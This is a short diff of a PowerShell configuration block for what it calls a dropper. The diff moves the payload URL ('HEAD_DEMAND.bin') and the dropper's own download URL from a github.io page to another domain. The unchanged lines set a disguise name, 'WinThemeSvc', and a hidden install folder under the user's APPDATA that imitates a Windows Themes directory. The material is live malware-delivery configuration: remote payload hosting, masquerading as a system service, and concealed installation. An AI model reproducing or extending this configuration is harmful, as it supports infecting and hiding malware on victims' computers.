@@ -1,6 +1,6 @@
 $CFG = @{
-  URL   = 'sadaqaty.github.io/page/HEAD_DEMAND.bin'
-  SELF  = 'sadaqaty.github.io/page/dropper.ps1'
+  URL   = 'security.fixarestudio.com/HEAD_DEMAND.bin'
+  SELF  = 'security.fixarestudio.com/dropper.ps1'
   B64   = 'auto'
   TAG   = 'WinThemeSvc'
   DIR   = "$env:APPDATA\Microsoft\Windows\Themes\themesvc"
